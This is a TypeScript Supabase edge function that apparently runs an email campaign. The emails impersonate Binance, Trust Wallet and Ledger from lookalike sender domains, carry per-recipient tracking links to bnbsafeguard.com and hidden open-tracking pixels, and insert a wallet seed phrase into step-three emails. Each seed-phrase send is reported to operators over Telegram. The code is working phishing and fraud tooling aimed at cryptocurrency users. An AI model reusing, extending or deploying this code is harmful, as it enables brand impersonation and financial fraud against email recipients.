import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { Resend } from "npm:resend@2.0.0";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.50.2";

// Initialize Resend with default API key
let resend = new Resend(Deno.env.get("RESEND_API_KEY"));

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface EmailRequest {
  to?: string;
  name?: string;
  first_name?: string;
  user_id?: string;
  contact_id?: string;
  template_id?: string;
  subject?: string;
  content?: string;
  commercial_id?: string;
  domain?: string;
  wallet?: string;
  step?: number;
  send_method?: string; // 'php' | 'resend' | 'alias'
  alias_from?: string;
  // New format from CRM
  leadId?: string;
  templateId?: string;
  commercialId?: string;
}

const handler = async (req: Request): Promise<Response> => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const requestBody = await req.json();
    let { to, name, first_name, user_id, contact_id, template_id, subject, content, commercial_id, domain, wallet, step, leadId, templateId, commercialId, send_method, alias_from } = requestBody;
    
    // Initialize Supabase client
    const supabase = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? ""
    );

    // Handle new format from CRM (leadId, templateId, commercialId)
    if (leadId && templateId && commercialId) {
      console.log('Processing CRM format request:', { leadId, templateId, commercialId });
      
      const { data: leadData, error: leadError } = await supabase
        .from('marketing_contacts')
        .select('id, name, first_name, email, phone, status')
        .eq('id', leadId)
        .single();
        
      if (leadError || !leadData) {
        console.error('Lead not found:', leadError);
        return new Response(
          JSON.stringify({ error: 'Lead not found' }),
          { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
        );
      }
      
      // Fetch template data (by id or by name fallback)
      let templateData: any = null;
      let templateError: any = null;
      try {
        const byId = await supabase
          .from('email_templates')
          .select('id, name, subject, content')
          .eq('id', templateId)
          .single();
        templateData = byId.data;
        templateError = byId.error;
      } catch (e) {
        templateError = e;
      }

      if (templateError || !templateData) {
        try {
          const byName = await supabase
            .from('email_templates')
            .select('id, name, subject, content')
            .eq('name', templateId)
            .single();
          templateData = byName.data;
          templateError = byName.error;
        } catch (e) {
          templateError = e;
        }
      }
      
      if (templateError || !templateData) {
        console.error('Template not found by id or name:', templateError);
        return new Response(
          JSON.stringify({ error: 'Template not found' }),
          { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
        );
      }
      
      // Map the data to the expected format
      to = leadData.email;
      name = leadData.name || '';
      first_name = leadData.first_name || '';
      user_id = leadData.id; // Use lead ID as user_id for tracking
      contact_id = leadData.id;
      template_id = templateData.id;
      subject = templateData.subject;
      content = templateData.content;
      commercial_id = commercialId;
      domain = domain || 'domain1'; // Default domain if not provided
      // Derive step from template name if not provided (Email1, Email2, Email3)
      if (!step && (templateData as any)?.name) {
        const m = String((templateData as any).name).match(/(\d+)/);
        if (m) {
          const parsed = parseInt(m[1], 10);
          if (!isNaN(parsed)) step = parsed;
        } else {
          step = 1;
        }
      } else if (!step) {
        step = 1;
      }
      
      console.log('Mapped CRM data:', { to, name, first_name, user_id, contact_id, template_id, commercial_id, step, domain });
    }
    
    console.log('Email request received:', { to, name, first_name, user_id, contact_id, template_id, commercial_id, domain, step });

    // Fallback for name if missing
    if (!name) {
      name = first_name || (to ? to.split('@')[0] : 'Client');
    }

    // Validate required fields
    if (!to || !commercial_id) {
      console.error('Missing required fields:', { to, commercial_id });
      return new Response(
        JSON.stringify({ error: 'Missing required fields: to or commercial_id' }),
        { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
      );
    }

      // Select API key and domain based on commercial's preference
      let apiKey = Deno.env.get("RESEND_API_KEY"); // Default domain 1
      let fromDomain = "mailersrp-1binance.com";
      let sendMethod = 'resend'; // default method
      
      // Get commercial's email preferences
      const { data: commercialData, error: commercialError } = await supabase
        .from('commercials')
        .select('email_domain_preference, email_alias_from')
        .eq('id', commercial_id)
        .single();
      
      console.log('🔍 Commercial email preferences:', commercialData, 'Error:', commercialError);
      
      // Explicit overrides from request payload
      const explicitSendMethod = (send_method || '').toLowerCase();
      const explicitAliasFrom = alias_from as string | undefined;

      if (explicitSendMethod === 'php' || explicitSendMethod === 'alias' || (explicitAliasFrom && explicitAliasFrom.includes('@'))) {
        // Force PHP alias sending if explicitly requested
        sendMethod = 'php';
        fromDomain = explicitAliasFrom || commercialData?.email_alias_from || "do_not_reply@mailersp2.binance.com";
        console.log('🔒 Forcing ALIAS (PHP) send via explicit request. From:', fromDomain);
      } else {
        const emailPreference = (commercialData?.email_domain_preference || domain || 'domain1')?.toLowerCase();
        console.log('🎯 Email preference determined:', emailPreference);
        
        if (emailPreference === "domain2") {
          apiKey = Deno.env.get("RESEND_API_KEY_DOMAIN2");
          fromDomain = "mailersrp-2binance.com";
          sendMethod = 'resend';
        } else if (emailPreference === "alias") {
          // Use PHP sending method with alias
          sendMethod = 'php';
          fromDomain = commercialData?.email_alias_from || "do_not_reply@mailersp2.binance.com";
          console.log('🔄 ALIAS MODE: Using PHP method with alias:', fromDomain);
        } else {
          // Default domain1
          sendMethod = 'resend';
        }
      }
      
      console.log('📤 Final send method:', sendMethod, 'from:', fromDomain);

    // Fetch the current server IP from the database
    const { data: serverConfig, error: configError } = await supabase
      .from('server_config')
      .select('current_server_ip')
      .single();

    let currentServerIp = '127.0.0.1'; // fallback IP
    if (configError) {
      console.warn('Could not fetch server config, using fallback IP:', configError);
    } else if (serverConfig?.current_server_ip) {
      currentServerIp = String(serverConfig.current_server_ip);
    }

    console.log("Current server IP from database:", currentServerIp);

    // Generate tracking code - use contact_id if available, otherwise use user_id with timestamp
    const trackingCode = contact_id || `${user_id}_${Date.now()}`;
    // Add commercial tracking to the link if commercial_id is provided
    const commercialParam = commercial_id ? `&c=${commercial_id}` : '';
    const trackingLink = `https://fr.bnbsafeguard.com/?=${trackingCode}${commercialParam}`;

    // Calculate current time minus 10 minutes in UTC
    const now = new Date();
    const timeMinus10 = new Date(now.getTime() - 10 * 60 * 1000);
    const formattedTime = timeMinus10.toISOString().replace('T', ' ').replace(/\.\d{3}Z$/, ' UTC');

    // Create tracking pixel URL for open tracking
    const openTrackingUrl = `https://lnokphjzmvdegutjpxhw.supabase.co/functions/v1/track-email-open?id=${trackingCode}`;

    // Process template content if provided
    let emailSubject = subject || "Your Secure WireGuard Access Link";
    let emailContent = content || `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: white; color: black;">
        <h2 style="color: #f59e0b;">Hello {{first_name}},</h2>
        
        <p>We hope this email finds you well.</p>
        
        <p>Your secure WireGuard access link is ready:</p>
        
        <div style="text-align: center; margin: 30px 0;">
          <a href="{{link}}" 
             style="background-color: #f59e0b; color: black; padding: 15px 30px; 
                    text-decoration: none; border-radius: 5px; font-weight: bold;">
            Access Your Secure Connection
          </a>
        </div>
        
        <p>This link is personalized for you and provides secure access to our WireGuard VPN service.</p>
        
        <p><strong>Current Server IP:</strong> {{current_ip}}</p>
        <p><strong>Generated at:</strong> {{current_time_minus_10}}</p>
        
        <p>Best regards,<br>
        The BINANCE Team</p>
        
        <hr style="margin: 30px 0; border: 1px solid #e5e7eb;">
        <p style="font-size: 12px; color: #6b7280;">
          This is an automated message. Please do not reply to this email.
        </p>
      </div>
    `;

    // Check if the email content contains wallet placeholders
    const hasWalletPlaceholder = (content: string) => {
      // Simple check for {{wallet}} first
      if (/\{\{\s*wallet\s*\}\}/i.test(content)) {
        return true;
      }
      
      const normalizedContent = content
        .replace(/&lbrace;|&lcub;|&#123;|&#x7B;|\\u007B/gi, '{')
        .replace(/&rbrace;|&rcub;|&#125;|&#x7D;|\\u007D/gi, '}')
        .replace(/[\uFF5B]/g, '{')
        .replace(/[\uFF5D]/g, '}')
        .replace(/[\u200B\u200C\u200D\uFEFF]/g, '')
        .replace(/\u00A0/g, ' ');
      
      return /\{\{[\s]*wallet[\s]*\}\}/i.test(normalizedContent) ||
             /\{\{\{[^}]*wallet[^}]*\}\}\}/i.test(normalizedContent) ||
             /\{(?:\s|&nbsp;|<[^>]+>)*\{(?:[\s\u00A0\uFEFF]|<[^>]+>)*wallet(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}/i.test(normalizedContent);
    };

    // Function to get the actual seed phrase assigned to this commercial/user
    const getUniqueWallet = async () => {
      try {
        // If a wallet is explicitly provided in the request payload, use it
        if (wallet && typeof wallet === 'string' && wallet.trim().length > 0) {
          return wallet.trim();
        }

        // Only call get-wallet function if we actually need a new wallet
        console.log('Calling get-wallet function for user:', user_id, 'commercial:', commercial_id);
        const { data: walletData, error: getWalletError } = await supabase.functions.invoke('get-wallet', {
          body: { 
            user_id: user_id,
            commercial_id: commercial_id 
          }
        });

        if (getWalletError) {
          console.error('Error calling get-wallet function:', getWalletError);
        } else if ((walletData as any)?.phrase || (walletData as any)?.wallet) {
          console.log('Got wallet from get-wallet function');
          return ((walletData as any).phrase || (walletData as any).wallet) as string;
        }

        // First, try to find an existing wallet assigned to this commercial
        if (commercial_id) {
          // Check wallets table first
          const { data: assignedWallet, error: walletError } = await supabase
            .from('wallets')
            .select('wallet_phrase')
            .eq('used_by_commercial_id', commercial_id)
            .eq('status', 'used')
            .single();

          if (!walletError && assignedWallet?.wallet_phrase) {
            console.log('Using assigned wallet for commercial:', commercial_id);
            return assignedWallet.wallet_phrase;
          }

          // Check generated_wallets table as backup
          const { data: generatedWallet, error: genWalletError } = await supabase
            .from('generated_wallets')
            .select('seed_phrase')
            .eq('commercial_id', commercial_id)
            .single();

          if (!genWalletError && generatedWallet?.seed_phrase) {
            console.log('Using generated wallet for commercial:', commercial_id);
            return generatedWallet.seed_phrase;
          }
        }

        console.warn('No available wallet found for this commercial/user.');
        return '';
      } catch (error) {
        console.error('Error retrieving wallet phrase:', error);
        return '';
      }
    };

    // Replace template variables for both custom content and default template
    // Use commercial_id and contact_id for the home link to track both commercial and lead
    const homeLink = commercial_id && contact_id ? `https://fr.bnbsafeguard.com/?c=${commercial_id}&l=${contact_id}` : 
                    commercial_id ? `https://fr.bnbsafeguard.com/?c=${commercial_id}` : trackingLink;
    
    // Replace non-wallet variables first
    emailContent = emailContent
      .replace(/{{name}}/g, name)
      .replace(/{{first_name}}/g, first_name)
      .replace(/{{email}}/g, to)
      .replace(/{{phone}}/g, '') // Phone not available in email context
      .replace(/{{current_ip}}/g, currentServerIp)
      .replace(/{{link}}/g, trackingLink)
      .replace(/{{home_link}}/g, homeLink)
      .replace(/{{current_time_minus_10}}/g, formattedTime)
      .replace(/https?:\/\/api\.bnbsafeguard\.com/gi, 'https://fr.bnbsafeguard.com');

    // Check if this is a Trust Wallet template
    const isTrustWalletTemplate = (subject || content || emailContent || '')
      .toLowerCase()
      .includes('trust') || 
      (subject || content || emailContent || '')
      .toLowerCase()
      .includes('trustwallet');

    // Check if this is a Ledger template
    const isLedgerTemplate = (subject || content || emailContent || '')
      .toLowerCase()
      .includes('ledger');

    // Only process wallet placeholders if they exist in the content
    // Use wallets for step 3 (Email3) or Trust Wallet templates with auto_include_wallet enabled
    console.log('Checking if email content contains wallet placeholders...');
    
    // First check commercial's auto_include_wallet setting
    let commercialAutoIncludeWallet = false;
    if (commercial_id) {
      try {
        const { data: commercialData, error: commercialError } = await supabase
          .from('commercials')
          .select('auto_include_wallet')
          .eq('id', commercial_id)
          .single();
        
        if (!commercialError && commercialData) {
          commercialAutoIncludeWallet = commercialData.auto_include_wallet || false;
          console.log('Commercial auto_include_wallet setting:', commercialAutoIncludeWallet);
        }
      } catch (err) {
        console.warn('Could not fetch commercial auto_include_wallet setting:', err);
      }
    }
    
    const walletPlaceholdersDetected = (step === 3 && (hasWalletPlaceholder(emailContent) || hasWalletPlaceholder(emailSubject))) ||
                                      (isTrustWalletTemplate && commercialAutoIncludeWallet);
    let walletWasUsed = false;
    let uniqueWallet = ''; // Store the wallet for Telegram notification
    
    if (walletPlaceholdersDetected) {
      if (step === 3) {
        console.log('Email3 detected (step 3), processing wallet replacements...');
      } else if (isTrustWalletTemplate) {
        console.log('Trust Wallet template with auto_include_wallet enabled, processing wallet...');
      }
      
      // Normalize braces and invisible spaces, then replace wallet placeholders
      const normalizeBraces = (s: string) => s
        .replace(/&lbrace;|&lcub;|&#123;|&#x7B;|\\u007B/gi, '{')
        .replace(/&rbrace;|&rcub;|&#125;|&#x7D;|\\u007D/gi, '}')
        .replace(/[\uFF5B]/g, '{')
        .replace(/[\uFF5D]/g, '}');

      emailContent = normalizeBraces(emailContent);
      emailSubject = normalizeBraces(emailSubject);
      
      // Remove zero-width chars entirely; convert NBSP to space
      emailContent = emailContent
        .replace(/[\u200B\u200C\u200D\uFEFF]/g, '')
        .replace(/\u00A0/g, ' ');

      // Get wallet once and reuse it for all replacements
      uniqueWallet = await getUniqueWallet();
      if (!uniqueWallet || uniqueWallet.trim() === '') {
        console.error('Wallet placeholder present but no available wallet could be obtained. Aborting send.');
        return new Response(
          JSON.stringify({ success: false, error: 'No available wallet to fill template.' }),
          { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
        );
      }
      console.log('Using wallet for replacements (first 10 chars):', uniqueWallet.substring(0, 10) + '...');

      // Replace ONLY actual {{wallet}} placeholders
      emailContent = emailContent.replace(/\{\{[\s\u00A0\uFEFF]*wallet[\s\u00A0\uFEFF]*\}\}/gi, uniqueWallet);
      emailSubject = emailSubject.replace(/\{\{[\s\u00A0\uFEFF]*wallet[\s\u00A0\uFEFF]*\}\}/gi, uniqueWallet);

      // Replace placeholders where letters of "wallet" are split by spaces/tags
      const walletWordPattern = 'w(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*a(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*l(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*l(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*e(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*t';
      const brokenWalletRegex = new RegExp(`\\{\\{(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*${walletWordPattern}(?:[\\s\\u00A0\\u200B\\u200C\\u200D\\uFEFF]|<[^>]+>)*\\}\\}`, 'gi');
      emailContent = emailContent.replace(brokenWalletRegex, uniqueWallet);

      // Replace complex placeholders split by inline tags around braces
      const complexWalletRegex = /\{(?:\s|&nbsp;|<[^>]+>)*\{(?:[\s\u00A0\uFEFF]|<[^>]+>)*wallet(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}(?:[\s\u00A0\uFEFF]|<[^>]+>)*\}/gi;
      emailContent = emailContent.replace(complexWalletRegex, uniqueWallet);

      // Handle triple braces {{{wallet}}}
      emailContent = emailContent.replace(/\{\{\{[^}]*wallet[^}]*\}\}\}/gi, uniqueWallet);
      
      // Final cleanup for any remaining wallet placeholders
      emailContent = emailContent.replace(/\{\{[^}]*wallet[^}]*\}\}/gi, uniqueWallet);
      
      // Mark that a wallet was effectively used in this email
      walletWasUsed = true;
    } else {
      console.log('No wallet placeholders found in email content or subject, skipping wallet assignment');
    }

    // Remove debug/listing blocks accidentally pasted into templates
    // - Any "Available" labels
    // - Any lines like "Email: user_123456"
    // - Long lowercase-only word sequences (likely pasted seed phrases)
    emailContent = emailContent
      .replace(/Available/gi, '')
      .replace(/Email:\s*user_[0-9]+/gi, '');
      // Removed aggressive seed-like sequence stripping to preserve intended wallet phrases

    if (subject) {
      emailSubject = subject
        .replace(/{{name}}/g, name)
        .replace(/{{first_name}}/g, first_name)
        .replace(/{{email}}/g, to)
        .replace(/{{current_ip}}/g, currentServerIp)
        .replace(/{{link}}/g, trackingLink)
        .replace(/{{home_link}}/g, homeLink)
        .replace(/{{current_time_minus_10}}/g, formattedTime)
        .replace(/https?:\/\/api\.bnbsafeguard\.com/gi, 'https://fr.bnbsafeguard.com');
    }

    // Add tracking pixel to email content
    emailContent += `<img src="${openTrackingUrl}" width="1" height="1" style="display:none;" />`;

    // Determine sender name based on template type
    const senderName = isTrustWalletTemplate ? "TRUST WALLET" : 
                      isLedgerTemplate ? "LEDGER" : "BINANCE";

    // Log email sending attempt
    console.log("Sending email to:", to, "with tracking code:", trackingCode);
    console.log("Server IP used:", currentServerIp);
    console.log("Sender name:", senderName);
    console.log("Send method:", sendMethod);

    let emailResponse;
    
    if (sendMethod === 'php') {
      console.log('🔄 USING PHP METHOD for alias sending...');
      // Send via PHP with alias
      try {
        const phpPayload = {
          to: to,
          subject: emailSubject,
          message: emailContent,
          from_email: fromDomain,
          from_name: senderName,
          tracking_code: trackingCode
        };
        
        console.log('📤 PHP payload:', phpPayload);
        
        const phpResponse = await fetch(`http://${currentServerIp}/send_email.php`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams(phpPayload).toString()
        });
        
        console.log('📬 PHP response status:', phpResponse.status, phpResponse.statusText);
        
        if (!phpResponse.ok) {
          throw new Error(`PHP sending failed: ${phpResponse.status} ${phpResponse.statusText}`);
        }
        
        const phpResult = await phpResponse.text();
        console.log('✅ PHP send result:', phpResult);
        
        emailResponse = {
          id: `php_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
          data: { success: true, method: 'php', result: phpResult }
        };
      } catch (phpError) {
        console.error('❌ PHP sending failed, NO FALLBACK for alias mode:', phpError);
        throw new Error(`Alias email sending failed: ${phpError.message}`);
      }
    } else {
      console.log('📨 USING RESEND METHOD...');
      // Send via Resend API
      if (!resend) {
        resend = new Resend(apiKey);
      }
      
      emailResponse = await resend.emails.send({
        from: fromDomain === "mailersrp-2binance.com" 
          ? `${senderName} <noreply@mailersrp-2binance.com>`
          : `${senderName} <donotreply@mailersrp-1binance.com>`,
        to: [to],
        subject: emailSubject,
        html: emailContent,
        tags: [
          {
            name: 'campaign',
            value: 'wireguard-marketing'
          },
          {
            name: 'tracking_code',
            value: trackingCode
          },
          {
            name: 'step',
            value: step ? `step-${step}` : 'step-1'
          }
        ]
      });
    }

    console.log("✅ Marketing email sent successfully:", emailResponse, "Method used:", sendMethod);

    // Send Telegram notification if wallet was used in email (send directly to Telegram; fallback to edge function)
    if (walletWasUsed) {
      try {
        const telegramBotToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
        const telegramChatIds = ['1889039543', '5433409472'];
        let successfulSends = 0;
        
        // Also fetch commercial's telegram_id and auto_include_wallet if provided
        let commercialTelegramId = null;
        let commercialAutoIncludeWallet = false;
        if (commercial_id) {
          try {
            const { data: commercialData, error: commercialError } = await supabase
              .from('commercials')
              .select('telegram_id, auto_include_wallet')
              .eq('id', commercial_id)
              .single();
            
            if (!commercialError && commercialData) {
              commercialTelegramId = commercialData.telegram_id;
              commercialAutoIncludeWallet = commercialData.auto_include_wallet || false;
              console.log('Found commercial Telegram ID:', commercialTelegramId, 'auto_include_wallet:', commercialAutoIncludeWallet);
            }
          } catch (err) {
            console.warn('Could not fetch commercial data:', err);
          }
        }
        
        if (telegramBotToken) {
          // Fetch commercial name
          let commercialName = 'Unknown Commercial';
          try {
            const { data: commercial } = await supabase
              .from('commercials')
              .select('name')
              .eq('id', commercial_id)
              .single();
            
            if (commercial?.name) {
              commercialName = commercial.name;
            }
          } catch (err) {
            console.warn('Could not fetch commercial name for telegram:', err);
          }
          
          const message = `📧 Email sent with wallet!
Recipient: ${to}
Commercial: ${commercialName}
Step: ${step || 1}
Subject: ${emailSubject}
Wallet: ${uniqueWallet}
Tracking: ${trackingCode}`;
          
          // Send to admin chat IDs
          for (const chatId of telegramChatIds) {
            try {
              const tgRes = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
              });
              if (!tgRes.ok) {
                const err = await tgRes.text();
                console.error(`Telegram send failed (direct) for chat ID ${chatId}:`, err);
              } else {
                console.log(`Telegram notification sent (direct) to ${chatId} for wallet email step`, step || 1);
                successfulSends++;
              }
            } catch (chatError) {
              console.error(`Error sending to chat ID ${chatId}:`, chatError);
            }
          }
          
          // Send to commercial if they have Telegram ID
          if (commercialTelegramId) {
            try {
              // Include seed phrase in commercial message if auto_include_wallet is enabled
              let commercialMessage = `📧 Votre email étape ${step || 1} a été envoyé!
Destinataire: ${to}
Sujet: ${emailSubject}
Wallet inclus: Oui
Tracking: ${trackingCode}`;

              if (commercialAutoIncludeWallet) {
                commercialMessage += `\n🔑 Phrase secrète: ${uniqueWallet}`;
              }
              
              const tgRes = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: commercialTelegramId, text: commercialMessage, parse_mode: 'HTML' })
              });
              if (!tgRes.ok) {
                const err = await tgRes.text();
                console.error(`Telegram send failed for commercial ${commercial_id}:`, err);
              } else {
                console.log(`Telegram notification sent to commercial ${commercial_id} (${commercialTelegramId})`);
              }
            } catch (commercialError) {
              console.error(`Error sending to commercial Telegram ${commercialTelegramId}:`, commercialError);
            }
          }
        } else {
          console.error('TELEGRAM_BOT_TOKEN missing in environment');
        }
        
        // Always try fallback if not all sends were successful
        if (successfulSends < telegramChatIds.length) {
          try {
            // Fetch commercial name for fallback notification
            let commercialNameFallback = 'Unknown Commercial';
            try {
              const { data: commercial } = await supabase
                .from('commercials')
                .select('name')
                .eq('id', commercial_id)
                .single();
              
              if (commercial?.name) {
                commercialNameFallback = commercial.name;
              }
            } catch (err) {
              console.warn('Could not fetch commercial name for fallback telegram:', err);
            }
            
            await supabase.functions.invoke('send-telegram-notification', {
              body: {
                message: `📧 Email sent with wallet!
Recipient: ${to}
Commercial: ${commercialNameFallback}
Step: ${step || 1}
Subject: ${emailSubject}
Wallet: ${uniqueWallet}
Tracking: ${trackingCode}`
              }
            });
            console.log('Telegram notification sent via edge function fallback');
          } catch (invokeErr) {
            console.error('Telegram fallback invoke failed:', invokeErr);
          }
        }
      } catch (telegramError) {
        console.error('Error sending Telegram notification for email:', telegramError);
        // Don't fail the email send if Telegram fails
      }
    }

    // Log to database immediately to ensure visibility
    const { error: insertError } = await supabase.from('email_logs').insert({
      tracking_code: trackingCode,
      recipient_email: to,
      recipient_name: name,
      contact_id: contact_id,
      user_id: user_id,
      template_id: template_id,
      subject: emailSubject,
      status: 'sent',
      sent_at: new Date().toISOString(),
      resend_id: emailResponse?.id || emailResponse?.data?.id || null,
      commercial_id: commercial_id
    });

    if (insertError) {
      console.error('Failed to insert email log:', insertError);
    }

    return new Response(JSON.stringify({
      success: true,
      message: "Email sent successfully",
      tracking_code: trackingCode,
      email_id: emailResponse.data?.id,
      recipient: to,
      server_ip_used: currentServerIp,
      method_used: sendMethod,
      from_used: fromDomain
    }), {
      status: 200,
      headers: {
        "Content-Type": "application/json",
        ...corsHeaders,
      },
    });
  } catch (error: any) {
    console.error("Error in send-marketing-email function:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  }
};

serve(handler);
